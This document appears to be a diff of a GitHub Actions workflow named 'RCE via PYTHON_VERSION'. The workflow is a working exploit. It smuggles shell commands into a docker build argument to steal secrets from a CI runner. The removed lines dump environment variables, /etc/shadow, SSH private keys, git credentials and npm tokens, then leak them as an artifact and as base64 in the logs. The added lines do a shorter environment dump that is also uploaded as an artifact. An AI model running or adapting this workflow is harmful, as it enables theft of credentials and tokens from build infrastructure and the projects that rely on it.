@@ -1,44 +1,25 @@
 name: RCE via PYTHON_VERSION
-on:
-  push:
+
+on: push
 
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repo
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Build + Extract Sensitive Files
+      - name: Inject and Leak
         run: |
-          mkdir -p leaks
+          mkdir -p output
           docker build \
-            --build-arg PYTHON_VERSION='
-              id
-              whoami
-              echo "[ENVIRONMENT]" && printenv
-              echo "[PROC ENVIRON]" && cat /proc/self/environ || true
-              echo "[SHADOW]" && cat /etc/shadow || true
-              echo "[HOSTS]" && cat /etc/hosts || true
-              echo "[PASSWD]" && cat /etc/passwd
-              echo "[PRIVATE SSH KEYS]" && find / -type f -name "id_rsa" -exec cat {} \; 2>/dev/null || true
-              echo "[HOMEDIR FILES]" && ls -la /root /home || true
-              echo "[GIT CONFIGS]" && find / -name ".git-credentials" -o -name ".gitconfig" -exec cat {} \; 2>/dev/null || true
-              echo "[NPM TOKENS]" && find / -name ".npmrc" -exec cat {} \; 2>/dev/null || true
-            ' \
-            -t deep-leak ./taskcluster/docker/python
-          
-          docker run --rm deep-leak > leaks/output.txt
-          tar -cvf leaks/leaks.tar leaks/output.txt
+            --build-arg PYTHON_VERSION="id && whoami && env > /leaks.txt && cp /leaks.txt /output/leaks.txt" \
+            -t leak ./taskcluster/docker/python
+          container_id=$(docker create leak)
+          docker cp $container_id:/output/leaks.txt leaks.txt
+          docker rm $container_id
 
-      - name: Upload as Artifact (Pinned SHA)
-        uses: actions/upload-artifact@dcbf53124a7ee6a2e3b6cb59c96345acfc9155f3
+      - name: Upload Leak Artifact
+        uses: actions/upload-artifact@v4
         with:
-          name: DeepLeaks
-          path: leaks/leaks.tar
-
-      - name: Base64 fallback to logs
-        if: always()
-        run: |
-          echo "====== BASE64 DUMP FOLLOWS ======"
-          base64 leaks/leaks.tar
+          name: leaked-env-vars
+          path: leaks.txt
